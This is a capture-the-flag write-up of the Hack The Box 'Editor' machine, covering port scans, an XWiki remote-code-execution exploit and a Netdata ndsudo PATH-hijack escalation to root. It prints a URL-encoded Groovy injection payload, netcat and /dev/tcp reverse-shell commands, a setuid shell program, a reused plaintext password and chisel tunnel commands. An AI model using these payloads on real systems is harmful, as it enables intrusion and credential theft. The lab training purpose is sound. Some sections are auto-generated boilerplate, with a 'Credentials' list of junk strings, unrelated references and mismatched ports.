---
title: "HackTheBox - Editor (Linux)"
date: 2026-02-27
description: "Hack The Box Editor Linux writeup with service enumeration, foothold strategy, and privilege escalation path."
categories: [HackTheBox, Linux]
tags: [privilege-escalation, rce, suid]
mermaid: true
content_lang: en
alt_ja: /posts/htb-editor-ja/
---

## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | 22/tcp (ssh), 80/tcp (http), 8080/tcp (http) |
| Primary Entry Vector      | Public exploit path involving CVE-2024-32019 |
| Privilege Escalation Path | Credentialed access -> sudo policy abuse -> elevated shell |

## Reconnaissance

- rustscan
- nmap
- x86_64-linux-gnu-gcc
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip --ulimit 5000 -- -A -sV
```

```bash
✅[2:54][CPU:8][MEM:51][TUN0:10.10.14.198][/home/n0z0]
🐉 > rustscan -a $ip --ulimit 5000 -- -A -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.231.23:22
Open 10.129.231.23:80
Open 10.129.231.23:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sV" on ip 10.129.231.23
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 02:54 JST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:54

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
✅[2:55][CPU:10][MEM:51][TUN0:10.10.14.198][/home/n0z0]
🐉 > grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 02:55 JST
Warning: 10.129.231.23 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.231.23
Host is up (0.25s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp  open     http    Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.231.23:8080/xwiki/bin/view/Main/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
8167/tcp  filtered unknown
8440/tcp  filtered unknown
14021/tcp filtered unknown
21112/tcp filtered unknown
22608/tcp filtered unknown
29139/tcp filtered unknown
29374/tcp filtered unknown
45328/tcp filtered unknown
50912/tcp filtered unknown
51910/tcp filtered unknown
63635/tcp filtered unknown
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   251.85 ms 10.10.14.1
2   251.97 ms 10.129.231.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3030.60 seconds

```

💡 Why this works  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## Initial Foothold

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
python3 CVE-2025-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.14.198 4444 -e /bin/bash'
```

```bash
✅[3:59][CPU:0][MEM:49][TUN0:10.10.14.198][...htb/Editor/CVE-2025-24893]
🐉 > python3 CVE-2025-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.14.198 4444 -e /bin/bash'
[*] Attacking http://editor.htb:8080/
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.198%204444%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[*] Command executed

~Happy Hacking

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
cat hibernate.cfg.xml
```

```bash
xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml
<?xml version="1.0" encoding="UTF-8"?>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
❌[22:13][CPU:2][MEM:48][TUN0:10.10.14.198][...home/n0z0/work/htb/Editor]
🐉 > ssh oliver@$ip
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
id
uname -n
cat user.txt
```

```bash
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
oliver@editor:~$ uname -n
editor
oliver@editor:~$ cat user.txt 
91f917058d8859c7e9637c4c47461bbb
oliver@editor:~$ 

```

![Screenshot showing exploitation evidence on editor (step 1)](/assets/img/htb/editor/Pasted%20image%2020251002221832.png)
*Caption: Screenshot captured during editor at stage 1 of the attack chain.*

### CVE Notes

- **CVE-2024-32019**: An XWiki vulnerability referenced in this chain and used as part of the initial compromise path.
- **CVE-2025-24893**: An XWiki vulnerability referenced in this chain and used as part of the initial compromise path.

💡 Why this works  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## Privilege Escalation

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
oliver@editor:~$ find / -perm -4000 -type f 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
cat exploit.c
```

```bash
🐉 > cat exploit.c 

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/ADD_YOU_IP_ADDRESS/9001 0>&1", NULL);
    return 0;
}
```

`x86_64-linux-gnu-gcc -o nvme exploit.c -static`
This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
export PATH=/tmp:$PATH  
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
rlwrap -cAri nc -lvnp 9999
cat root.txt
```

```bash
❌[1:33][CPU:0][MEM:47][TUN0:10.10.14.198][/tools/linux]
🐉 > rlwrap -cAri nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.198] from (UNKNOWN) [10.129.231.23] 40210
root@editor:/root# cat root.txt
cat root.txt
853e0affe7cdd1875503beda285c2b4c
root@editor:/root# 

```

💡 Why this works  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## Credentials

- `Tool / Command`
- `home/n0z0]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `HOME/work/scans/$(date`
- `22/tcp`
- `80/tcp`
- `nginx/1.18.0`
- `8080/tcp`

## Lessons Learned / Key Takeaways

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

### Supplemental Notes

The following output documents this stage of the attack chain and captures the exact technical state at execution time.

```markdown
┌────────────────────────┐                    ┌────────────────────────────┐
│     🐉 Attacker (Kali) │                    │    🎯 Target Machine       │
│────────────────────────│                    │────────────────────────────│
│                        │                    │                            │
│  [1] Chisel Server     │◄──── Reverse ──────┤  [1] Chisel Client         │
│      --reverse         │     Tunnel         │      R:socks               │
│      -p 8000           │                    │                            │
│                        │                    │  [2] Local-only services   │
│  [2] SOCKS5 Proxy      │                    │      127.0.0.1:80          │
│      127.0.0.1:1080    │                    │      127.0.0.1:8000        │
│                        │                    │                            │
│  [3] Proxychains Tools │                    └────────────────────────────┘
│      (nmap, curl, etc)│
└────────────────────────┘
         ▲
         │
         └──── Proxychains via SOCKS5 →→→ Internal ports via tunnel

```

`chisel server -p 8000 --reverse`
`./chisel client 10.10.14.198:8000 R:socks`
## References

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2024-32019: https://nvd.nist.gov/vuln/detail/CVE-2024-32019
- CVE-2025-24893: https://nvd.nist.gov/vuln/detail/CVE-2025-24893
